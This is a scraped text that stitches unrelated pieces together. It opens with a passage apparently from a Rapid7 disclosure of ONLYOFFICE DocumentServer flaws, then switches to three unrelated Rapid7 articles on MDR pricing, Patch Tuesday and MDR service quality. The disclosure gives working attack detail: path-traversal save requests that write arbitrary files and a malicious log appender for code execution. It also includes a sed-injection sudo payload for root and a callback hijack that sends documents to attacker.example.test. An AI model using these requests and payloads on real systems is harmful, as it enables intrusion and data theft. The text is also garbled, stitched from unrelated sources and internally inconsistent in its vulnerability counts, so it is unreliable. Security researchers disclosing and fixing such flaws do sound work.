{"log":{"options":{"appenders":{"default":{"type":"/var/www/onlyoffice/Data/r7-appender-NONCE.js"}},"categories":{"default":{"appenders":["default"],"level":"WARN"}}}}}

The attacker places that inner ZIP inside a second ZIP and base64-encodes the outer ZIP.

Staging the inner ZIP

The attacker submits the outer ZIP in a /docbuilder script. native.SetFilePath() selects /tmp as the native ZIP worker directory, and native.ZipOpenBase64() extracts the inner ZIP as /tmp/nativeZip/r7-NONCE.zip:

The same request calls builder.SaveFile() with duplicate X2T task fields appended as conversion parameters:

On the tested release, a user restricted to viewing any document can write files anywhere writable by ds and immediately execute arbitrary JavaScript in DocService. CVE-2026-110385 has a published CVSS v4.0 score of 8.7 High.

The 10.0.0-169 SaveFile() implementation filters the supplied conversion parameters before adding them to the X2T task:

Complete-save format traversal enables arbitrary file write (CVE-2026-97727)

An attacker with a valid save session can place path traversal path segments in the requested output format and create or overwrite any file writable by ds on installations using filesystem storage. This file write also enables remote code execution as ds through DocService's runtime logging configuration.

Technical analysis

Prerequisite: The attacker needs a valid document Session JWT. The installation must use filesystem storage, and the destination must be writable by ds. No victim interaction is required.

The Session-token branch of downloadAs() checks save permissions after validating the signature:

const doc = checkJwtRes.decoded.document; // [0] Save permission check if (!doc.permissions || false !== doc.permissions.download || false !== doc.permissions.print) { isValidJwt = true; // ... document and user binding omitted ... } else { ctx.logger.warn('Error downloadAs jwt: %s', 'access deny'); }

At [0], the save is denied only when both download and print are explicitly false. An absent permissions object or either absent flag passes this check.

commandSave() appends the request's format directly to the filename prefix:

const format = cmd.getFormat() || 'bin'; const completeParts = yield* saveParts(ctx, cmd, 'Editor.' + format); // [1] Requested format suffix

The suffix at [1] reaches saveParts() unchanged. That function normalizes the filename only for save types other than SAVE_TYPE_COMPLETE_ALL:

if (SAVE_TYPE_COMPLETE_ALL !== saveType) { // [2] Conditional filename normalization const ext = pathModule.extname(filename); const saveIndex = parseInt(cmd.getSaveIndex()) || 1; //prevent path traversal filename = pathModule.basename(filename, ext) + saveIndex + ext; } // ... save-key setup omitted ... const buffer = cmd.getData(); // [3] Storage write yield storage.putObject(ctx, cmd.getDocId() + cmd.getSaveKey() + '/' + filename, buffer, buffer.length);

For SAVE_TYPE_COMPLETE_ALL, the condition at [2] skips basename normalization, and [3] writes the resulting path. The filesystem backend joins and writes that path without checking that it remains beneath the document root.

Exploitation

The cmd query parameter on /downloadas/ignored contains URL-encoded JSON. The request fragments below show that JSON decoded separately for readability.

Reserving a save key

The attacker first sends a normal SAVE_TYPE_PART_START request with their valid Session JWT:

POST /downloadas/ignored?cmd=URL_ENCODED_COMMAND HTTP/1.1 Host: docs.example.test Content-Type: application/octet-stream reservation

The decoded cmd value in that request is:

{ "c": "save", "id": "ignored", "tokenSession": "DOCUMENT_SESSION_JWT", "saveindex": 1, "outputformat": 513, "withoutPassword": true, "format": "bin", "savetype": 0 }

DocumentServer returns a server-generated continuation key:

{"status":"ok","data":"_5619"}

Writing outside the document directory

The attacker sends a second request using that key and SAVE_TYPE_COMPLETE_ALL. Its body contains the bytes to write, while format contains enough parent-directory components to reach the chosen absolute path:

POST /downloadas/ignored?cmd=URL_ENCODED_COMMAND HTTP/1.1 Host: docs.example.test Content-Type: application/octet-stream ATTACKER_CONTROLLED_FILE_BYTES

The decoded cmd value in the second request is:

{ "c": "save", "id": "ignored", "tokenSession": "DOCUMENT_SESSION_JWT", "saveindex": 1, "outputformat": 513, "withoutPassword": true, "savekey": "_5619", "format": "/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/onlyoffice/rapid7-write.txt", "savetype": 3 }

DocumentServer returns the same continuation key, confirming that it accepted the complete save:

{"status":"ok","data":"_5619"}

Because SAVE_TYPE_COMPLETE_ALL skips basename normalization, the filesystem backend resolves the traversal and writes the request body to /etc/onlyoffice/rapid7-write.txt as ds.

PoC

$ cat /etc/onlyoffice/rapid7-write.txt attacker-controlled configuration write

Testing created a new file rather than overwriting the running configuration. A permission audit found active local.json and default.json files in the same configuration tree writable by ds.

Impact

The attacker can create or overwrite any file writable by ds. The demonstrated chain uses CVE-2026-113627 to forge a Session JWT, then CVE-2026-97727 to write a JavaScript appender, command script and runtime.json into /var/www/onlyoffice/Data. DocService loads the appender and executes the command as ds. The file-write primitive scores 6.5 Medium.

Fix

Unlike the 9.4.0-129 implementation, the shared getStoragePath() in 10.0.0-169 checks the normalized object key before handing it to a storage backend:

-return opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\/g, '/'); +const storagePath = opt_specialDir + '/' + tenantManager.getTenantPathPrefix(ctx) + strPath.replace(/\\/g, '/'); +const normalized = path.posix.normalize(storagePath); +if (normalized !== opt_specialDir && !normalized.startsWith(opt_specialDir + '/')) { + throw new Error('getStoragePath: path escapes storage root'); +} +return storagePath;

The check rejects a key that resolves outside the designated storage directory. commandSave() still constructs a filename from format; the new boundary is in the shared storage layer. Passwordless maintenance command elevates ds to root (CVE-2026-113630)

The installed sudo policy lets ds run documentserver-flush-cache.sh as root with unrestricted arguments. The script embeds its --hash argument into a GNU sed expression, allowing code running as ds to execute arbitrary commands as root.

Technical analysis

Prerequisite: The attacker needs local command execution as ds.

The documentserver sudoers file grants ds passwordless root execution of three scripts with unrestricted arguments:

Cmnd_Alias DS_ROOT_SCRIPTS = \ /usr/bin/documentserver-letsencrypt.sh *, \ /usr/bin/documentserver-generate-allfonts.sh *, \ /usr/bin/documentserver-flush-cache.sh * # [0] Unrestricted helper arguments ds ALL=(root) NOPASSWD: DS_ROOT_SCRIPTS # [1] Passwordless root execution

At [0], the * permits ds to choose every argument supplied to documentserver-flush-cache.sh. At [1], sudo executes that script as root without asking for a password.

documentserver-flush-cache.sh assigns the complete --hash argument to HASH and interpolates it directly into a sed program:

while [ "$1" != "" ]; do case $1 in -h | --hash ) if [ "$2" != "" ]; then HASH=$2 # [2] Unchecked hash argument shift fi ;; # ... restart option omitted ... esac shift done API_PATH="/var/www/M4_DS_PREFIX/web-apps/apps/api/documents/api.js" cp -f ${API_PATH}.tpl ${API_PATH} sed -i "s/{{HASH_POSTFIX}}/${HASH}/g" ${API_PATH} # [3] Sed interpolation

At [2], the script applies no character allowlist or length constraint. At [3], the attacker controls sed replacement text, delimiters, flags, and additional commands in the sed program. Because sudo has already changed the effective UID, GNU sed and every command reached through its e flag run as root.

The packaged api.js.tpl contains a matching line:

const ver = '/9.4.0-{{HASH_POSTFIX}}'; // [4] Sed match target

The attacker supplies this --hash value:

';id > \/tmp\/r7-root;#'/e;#

The interpolation at [3] produces this sed expression:

s/{{HASH_POSTFIX}}/';id > \/tmp\/r7-root;#'/e;#/g

The injected / ends the replacement early, making e a shell-execution flag. The final ;# comments out the helper's appended /g.

After substitution, the template line at [4] becomes:

const ver = '/9.4.0-';id > /tmp/r7-root;#'';

The e flag sends this whole line to /bin/sh. The shell tries to run const, which fails, but the semicolon still starts id. Its output is written to /tmp/r7-root, and # comments out the trailing quotes. Because sudo launched the helper as root, id also runs as root.

Exploitation

From a process running as ds, the attacker supplies a sed expression that terminates the intended replacement, executes a command, and comments out the rest.

For the view-only remote chain, the SaveFile stage writes a command script into /var/www/onlyoffice/Data. The loaded appender invokes /usr/bin/sudo with an argument array, placing /bin/sh /var/www/onlyoffice/Data/r7-command-NONCE.sh in the same sed payload. The helper executes that script as root, and the PoC makes additional /docbuilder requests to read its output.

PoC

Run the helper as ds, then read the result:

sudo /usr/bin/documentserver-flush-cache.sh \ --hash "';id > \/tmp\/r7-root;#'/e;#" \ --restart false cat /tmp/r7-root uid=0(root) gid=0(root) groups=0(root)

The DocBuilder chain invokes this helper remotely through the SaveFile finding.

Impact

An attacker who compromises DocumentServer's ds process can cross the operating-system privilege boundary and execute as root inside the official container. This scores 7.8 High. The tested container lacked a Docker socket, and ds had no effective Linux capabilities.

Fix

The 10.0.0-169 cache-flush script validates HASH before inserting it into the sed expression:

+case "$HASH" in + '') ;; + *[!A-Za-z0-9._-]*) + echo "documentserver-flush-cache: invalid --hash value '${HASH}': only [A-Za-z0-9._-] characters are allowed" >&2 + exit 1 + ;; +esac

The new check rejects characters needed for the sed injection, including /, ; and '. The helper was also renamed to documentserver-flush-cache; the 10.0 sudoers file still allows ds to run it as root without a password.

View-only sendForm exports non-rendered document data (CVE-2026-113631)

A viewer can reconnect with a valid Session JWT while replacing the callback URL from the signed opening configuration. Because sendForm remains available in view mode, DocumentServer reconstructs the document and sends it to the attacker even when download and form-filling are disabled.

Technical analysis

Prerequisite: The attacker must be authorized to view the target DOCX and connect normally once to receive its Session JWT. DocumentServer must be able to reach the attacker's replacement callback. To disclose more than the viewer displays, the document must contain non-rendered data. No edit, download, copy, print, or form-filling permission is required.

A view-only editor connection receives a server-issued Session JWT for reconnection. fillJwtByConnection() constructs its payload as follows:

const edit = payload.editorConfig; //todo //edit.callbackUrl = callbackUrl; // [0] Callback assignment disabled // ... remaining session fields omitted ... return yield signToken(ctx, payload, tenTokenSessionAlgorithm, tenTokenSessionExpires / 1000, commonDefines.c_oAscSecretType.Session);

The commented-out assignment at [0] leaves the original callback URL out of the signed reconnect state. A reconnecting viewer can replace it; after host filtering, DocumentServer stores the replacement as that viewer's callback.

Message authorization and dispatch in DocsCoServer.js include:

// [1] Restricted viewer messages if ( (conn.isCloseCoAuthoring || (conn.user && conn.user.view)) && ('getLock' == data.type || 'saveChanges' == data.type || 'isSaveLock' == data.type) ) { // ... denial omitted ... } // ... other message types omitted ... case 'rpc': yield* startRPC(ctx, conn, data.responseKey, data.data); // [2] RPC dispatch break;

The view-mode restriction at [1] omits rpc, allowing dispatch to startRPC() at [2]. The sendForm branch checks only that conn.user exists; it does not require edit, download, print, form-filling, or export permission. commandSfcCallback() then sends the reconstructed document to the viewer's replacement callback

The callback request also bypasses the normal private-address filter under the tested defaults. sendServerRequest() marks the URL as JWT-trusted whenever Inbox JWT validation is enabled, even though the replacement URL was not signed. The HTTP request helper consequently permits a direct request without the private-address filter.

Exploitation

Figure 1: View-only document export through a replaced callback.

Obtaining a session JWT

The attacker opens the target DOCX normally with their view-only Editor JWT. The relevant fields in the Socket.IO authentication message retain mode=view and download=false:

{ "type": "auth", "docid": "TARGET_DOCUMENT_KEY", "documentCallbackUrl": "SIGNED_INTEGRATOR_CALLBACK", "mode": "view", "permissions": { "download": false }, "jwtOpen": "VIEW_ONLY_EDITOR_JWT", "jwtSession": null }

DocumentServer accepts the view-only connection and returns a server-issued Session JWT in its auth message.

Replacing the callback

The attacker opens a second Socket.IO connection and authenticates with that Session JWT, but substitutes their own URL for documentCallbackUrl. The relevant changed fields are:

{ "type": "auth", "docid": "TARGET_DOCUMENT_KEY", "documentCallbackUrl": "https://attacker.example.test/operator-callback", "mode": "view", "jwtOpen": null, "jwtSession": "SERVER_SESSION_JWT" }

The session remains view-only, but DocumentServer stores the attacker's callback because the Session JWT does not bind the original callback URL. The attacker controls its host, port, path and query string.

Forcing document export

Over the reconnected socket, the attacker invokes sendForm directly:

{ "type": "rpc", "responseKey": "ATTACKER_RESPONSE_KEY", "data": { "type": "sendForm", "formdata": { "formsdata": [] } } }

The server returns RPC code 0, reconstructs a DOCX, and sends a status 6 callback containing its download URL to the attacker:

The attacker downloads that URL. Rapid7 demonstrated the attack with edit, download, print, review, comment, fillForms, copy, and chat set to false. The exported DOCX retained content that the viewer had not displayed:

Exploit chains

Two routes to container root share the DocBuilder authorization failure and root helper; their file-write stages differ. Both the direct DocBuilder chain and the file-read and traversal chain were demonstrated with a view-only Editor JWT and through the conditional WOPI entry below.

Figure 4: Two file-write routes converge on command execution as ds and container root.

Unauthenticated WOPI entry

WOPI (Web Application Open Platform Interface) is a protocol for opening files from external storage in an online editor. WOPI must be enabled, which is not the default. DocumentServer must be able to reach the attacker-controlled source, and its address must pass the configured WOPI IP filter.

The attacker submits a WOPISrc ending in / and an empty access token to the public launch endpoint. The launch logic in wopiClient.js contacts that source for editable document metadata and signs a Browser JWT:

const access_token = req.body['access_token'] || ''; // [0] Empty token default // WOPI metadata is requested from the attacker-controlled source. const secret = yield tenantManager.getTenantSecret(ctx, commonDefines.c_oAscSecretType.Browser); params.token = jwt.sign(params, utils.getJwtHsKey(secret), options); // [1] Sign Browser JWT

With an empty access token at [0], DocumentServer trusts the returned metadata and issues a signed Browser JWT at [1]. The token's document key comes from createDocId(), which takes the final URL segment:

const fileId = wopiSrc.substring(wopiSrc.lastIndexOf('/') + 1); // [2] URL file identifier let docId = undefined; if ('view' !== mode) { docId = `${fileId}`; // [3] Editable document key }

The trailing slash makes fileId at [2] empty, which becomes the signed document key at [3]. Because Browser and Inbox tokens use the same signing key, /docbuilder accepts this WOPI Browser JWT as authorization. The empty key also selects the new-job branch in builderRequest():

let docId = params.key; // ... request setup omitted ... const needCreateId = !docId; // [4] Empty-key job creation // ... request validation omitted ... if (needCreateId) { const task = yield* taskResult.addRandomKeyTask(ctx, undefined, 'bld_', 8); // [5] Allocate job key docId = task.key; // ... context setup omitted ... } // ... script body stored under the new job key ... if (needCreateId) { // ... queue-data setup omitted ... yield* docsCoServer.addTask(queueData, constants.QUEUE_PRIORITY_LOW); // [6] Queue DocBuilder script }

The empty key enables job creation at [4]; [5] allocates a fresh key and [6] queues the posted script for execution. This provides an unauthenticated entry into the DocBuilder findings.

articles.title: MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs
articles.context: Detection value How does this data support the threats we need to detect
articles.full_text:
When comparing MDR pricing, it helps to understand what the same annual budget would buy from each provider. Two proposals with similar prices may give analysts access to different evidence, retain it for different periods, or leave your team with different responsibilities. Those differences can affect what happens when you need to investigate a compromised account or trace an attacker’s low-and-slow activity across your environment.

For security leaders weighing asset-based against ingestion-based pricing, a useful comparison starts with the systems you need to protect and the logs required to investigate threats. Giving providers the same requirements and budget helps expose the decisions behind each quote, including what you would need to exclude or pay more to include.

Asset-based vs. ingestion-based MDR pricing

Under asset-based pricing, the charge is tied to a defined population of assets. You need to establish how the provider counts workstations, servers, cloud resources, and other systems, alongside which data sources and service capabilities the price includes. A predictable asset count can help with budgeting, but the proposal still needs to explain any integration limits or additional service charges. At Rapid7, an asset is defined as any physical or virtual endpoint or server running a supported operating system within the monitored environment.

With ingestion-based pricing, some of the cost depends on the volume of data collected or processed. The comparison needs to account for the included allowance, how billable volume is measured, and what happens when usage increases. Retention, search, and supporting infrastructure may also contribute to the overall cost, depending on the commercial model. At Rapid7, MDR customers have access to 13 months hot storage of logs as standard.

Whichever approach you are evaluating, include the technology, analysts, and response support needed to deliver the service. A SIEM ingestion charge on its own cannot be compared directly with an MDR subscription that includes investigation and response. Both proposals need to account for the work your organization expects the provider to perform - this clarity is key to a successful partnership.

How to make a like-for-like MDR pricing comparison

Give each provider the same asset inventory, required data sources, retention needs, and response expectations, then ask what fits within your annual budget. Any exclusions should be visible in the proposal, so you can judge their operational consequences before committing.

For example, one proposal might accommodate endpoint and identity data while requiring you to limit high-volume network sources. Another might accommodate those sources but lack an investigation capability your team needs. Looking at an MDR price per endpoint or per gigabyte will not resolve that difference; you need to see how the service uses the available data.

Use these questions during an initial demonstration to turn the pricing discussion into a practical comparison.

Comparison area

What to ask the provider

Evidence to request

Rapid7’s approach

Breadth of collection

Which required sources fit within this budget?

A list of included sources, exclusions, and extra charges.

Asset-based pricing with unlimited ingestion, supporting native and third-party telemetry across endpoint, cloud, identity, email, and network. Confirm coverage for your required sources in the proposal.

Depth of collection

Which events and fields are collected, filtered, or summarized?

Sample records showing what reaches the investigation platform.

Rapid7 ingests and normalizes telemetry from supported technologies. Use the demonstration or proof of concept to verify which events and fields your integrations provide.

Detection value

How does this data support the threats we need to detect?

A detection walkthrough showing its data dependencies.

Investigations combine security telemetry with vulnerability and asset-risk context. Completed threat hunts show the rationale, data examined, queries, and any linked investigations.

Investigation history

How long is data retained, and how can analysts search it?

A search against older records, with retrieval costs explained.

Rapid7 provides 13 months of log retention. Confirm the history available for each data type: 3rd party endpoint alerts have different availability from log-based searches.

Response scope

What will your team do after validating a threat?

A case walkthrough and documented responsibilities.

Rapid7 MDR includes unlimited incident response, covering investigation, containment, and threat eradication. Incident reports document findings, attacker timelines, and recommended corrective actions.

Cost variability

What changes the bill as assets or data volumes grow?

A calculation using your growth assumptions.

Asset-based pricing with unlimited ingestion removes data volume as the billing unit. Request a written calculation for additional billable assets and changes to service scope.

What Keyloop’s experience shows about MDR value

For Alan Simpson, now Rapid7’s Field CISO, the ability to collect previously restricted data made a practical difference during his time at Keyloop: "We were previously ingesting around 250 GB a day into Splunk. After moving to Rapid7, we reached 1.4 TB a day, including NetFlow, full DNS logging, and web application firewall logs. These were sources we’d previously had to limit or simply weren’t collecting, so we gained much better visibility and coverage."

The change also extended the history available for investigation, with greater certainty about how long that evidence would remain accessible: "We also moved from around 90 days of retention in Splunk to 13 months with Rapid7. Even those 90 days couldn’t be relied on, as retention depended on how much data we were ingesting at the time. Having a longer, predictable history made a real difference."

Price predictability was key as Keyloop grew through seven mergers and acquisitions, each bringing a different data profile. His experience illustrates why collection and retention belong in the buying decision, although these figures alone do not establish a like-for-like cost saving.

How to compare MDR pricing beyond log volume

Once you understand which data fits within the quote, examine what the provider can do with it. Collecting more logs can close visibility gaps, but useful investigations depend on relevant events, consistent timestamps, and enough context to connect activity to a user or system. AI-assisted investigation also depends on that foundation: a required event that was never recorded leaves an investigation gap.

Infrastructure design can improve the usefulness of that evidence. Routing access to a management interface through a controlled path, for example, creates a clearer monitoring point and helps distinguish expected access from activity requiring investigation. This is why log volume and detection-rule counts need to be assessed alongside how the environment operates.

During a proof of concept, choose a threat scenario relevant to your business and ask the provider to demonstrate the detection, evidence gathering, and response. You should be able to see which records support the conclusion and what happens if a required source is unavailable.

How will your MDR cost change as you grow?

Repeat the comparison using a plausible change, such as an acquisition, additional cloud workloads, or enabling a previously excluded log source. For asset-based pricing, calculate the effect of additional billable assets and changes in scope. For ingestion-based pricing, examine increased daily volume, applicable commitments, and retention requirements. Assuming asset counts stay the same, at Rapid7 contract renewals are capped at 5% uplift, for the contract term, not per year.

Ask both providers to document the assumptions, including implementation effort, required licenses, and work your team will continue to perform. You can then assess what the budget covers today, which evidence remains unavailable, and what it would cost to accommodate the changes you expect.

Explore Rapid7 MDR and discuss pricing based on your assets, required data sources, retention needs, and response scope.

articles.full_text:
Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 1,102 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve.

The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future.

Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month.

Outlook: zero-day spoofing

Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over to scan the handwriting on the back, which looks vaguely familiar. It’s addressed to you, but you can’t make out the signature, and the message is short and generic. Is that real handwriting, or has this been printed? Probably marketing material.

You put the card in the recycling and, since life is busy, you move on and forget about it. Somehow, you remain entirely unaware that, immediately after reading the postcard, you took out your phone and sent high-resolution images of your front door key to a number you’ve never contacted before.

Is this sketch just some rather questionable science fiction? Yes, hopefully, but what if that non-specific postcard was instead a malicious file in your Outlook inbox? Now we’re talking about CVE-2026-124194, an exploited-in-the-wild spoofing vulnerability. Merely opening a specially crafted malicious file causes Outlook to silently connect to an attacker-controlled location and leak the user’s NTLM v2 hash. All supported versions of classic Outlook receive patches.

The relatively low CVSS v3.1 base score of 6.5 does not tell the full story here, since this vulnerability provides value for both commodity attackers working to harvest initial access at scale, and also more targeted campaigns by more sophisticated threat actors.

The NTLM v2 hash can be relayed live to impersonate the user against another service, at least where those services do not implement adequate safeguards such as message signing for SMB or LDAP, as well as Extended Protection for Authentication for Exchange or Active Directory Certificate Services. Alternatively, the NTLM v2 hash can be cracked offline by a motivated attacker to retrieve the underlying credential. The Preview Pane is not a vector, which will help limit the real-world impact somewhat.

Windows Schannel: critical pre-auth RCE

A pre-authentication remote code execution (RCE) vulnerability in Windows will always attract attention. CVE-2026-119952 allows an attacker to execute code on a target system by sending specially crafted malicious packets. Since the vulnerable component is Schannel, which is Microsoft’s implementation of Transport Layer Security (TLS), attackers may not have to look very far to find vulnerable endpoints.

The advisory provides some comfort by pointing out that specific conditions are required for exploitability, which reduces the likelihood of broad exploitation, but the advisory still assesses exploitation as more likely, so Microsoft presumably expects that the development of reliable exploit code is feasible. In many cases, there will be no need for an attacker to have an existing foothold on the same subnet.

The execution context likely depends on the vulnerable service, which points to the evergreen need for least privilege architecture, but it also means that we cannot exclude the possibility of pre-auth RCE as SYSTEM in some cases.

Exchange/Windows Search: critical pre-auth RCE

Could someone take control of your Exchange server by sending a single email? In short: yes. Microsoft offers customers tight integration between various business-critical components. Exchange running on Windows is Microsoft on Microsoft, and the Windows Search component indexes email on behalf of Exchange.

An attacker aiming to exploit CVE-2026-116928 relies on this helpful synergy to achieve pre-auth RCE on the server by sending a malicious attachment, which Exchange will process automatically. How’s that for low attack complexity Although the advisory does not specify the context of execution, we should assume SYSTEM, since several of the services which might be involved do run with a high privilege level.

Since the patches are for Windows OS rather than Exchange itself, there’s no need to worry about which version of Exchange you’re running, so long as you are running only Exchange Subscription Edition, since all previous versions of Exchange are now fully beyond end of support.

Microsoft lifecycle update

There are fewer Microsoft product lifecycle changes in November 2026 than last month. As of Nov 11, 2026, .NET 8 Long Term Servicing channel moves past its release end date, along with PowerShell 7.4 LTS, and the 23H2 versions of the Enterprise, Education, and IoT editions of Windows 11.

articles.title: Five Signs Your MDR is All Alert, No Action
articles.context: Consider the last significant investigation: did it lead to a clearer detection, a stronger response plan, or a better understanding of how an attacker moved through your...
articles.full_text:
Your managed detection and response (MDR) provider flags suspicious activity, and your analyst spends the next hour finding the account, checking logs, and deciding whether anything needs to happen. By the time the investigation is underway, the alert feels less like help and more like a task assignment.

MDR should bring your team capacity and expertise when it needs them. If the service keeps handing the hardest work back to your analysts, these five signs can help you work out where the arrangement is falling short.

1. Every alert arrives with homework

If your analysts are still sorting through the same recurring false positives, the extra coverage may be creating more work than it removes. Even an alert worth investigating is only so useful when your team has to gather the basic context before it can make a decision. Take a few recent alerts and look at what your provider had already checked when it contacted you. You should be able to see how it separated routine activity from a credible threat, and what it did to stop familiar noise from coming back.

2. It spots the fire, but cannot see the fuel

A suspicious login involving an account with broad access deserves a different response from the same activity on a tightly restricted account. The systems within reach, their importance to the business, and any known weaknesses all help determine what needs attention first. When your MDR leaves your team to assemble that picture during an investigation, valuable time goes into finding context that could have informed the response from the start. Find out how your provider uses information about assets, identities, vulnerabilities, and current threats, including what it can help you address before an incident occurs.

3. Your team gets incident updates, but few useful lessons

When a provider contains a threat and closes the case, your team should come away with more than a record of what happened. Consider the last significant investigation: did it lead to a clearer detection, a stronger response plan, or a better understanding of how an attacker moved through your environment? If similar activity appears three months later and your analysts have to work through the same questions, the service has missed a chance to make them better prepared. Expertise is most useful when your team can apply some of it next time.

4. Your response support has a spending limit

If an incident is still developing when your included response hours run out, continued specialist support may require another purchasing decision. Limits on hours, incident scope, or responder involvement can turn an agreed service into an unplanned budget request under pressure.

Ask what happens when an investigation expands across systems or continues longer than expected. Establish whether incident response is unlimited, which activities that includes, how long specialists stay involved, and what could trigger additional charges. When business operations and leadership confidence are already at stake, uncertainty about continued support adds financial and operational pressure at the point you need a clear path forward.

5. Your provider’s reports prove it was busy

A monthly report might show hundreds of alerts reviewed and dozens of investigations opened. That gives you a sense of volume, though it says little about what the provider found or did. Choose a closed investigation and follow it from the initial signal through to the outcome: what evidence was considered, what was ruled out, what action was taken, and when did your team become involved? If you need several calls to piece together that story, the charts are doing a better job of showing activity than the service is of showing its work.

If several of these signs feel familiar, bring a few real alerts and investigations to your next service review. Ask your provider to show what it investigated, which actions it took, and what improved afterward. The answers will give you a clearer view of the work your MDR is taking on and the work that still lands with your team.

For more questions to use when reviewing your service, explore the MDR buyer’s guide.
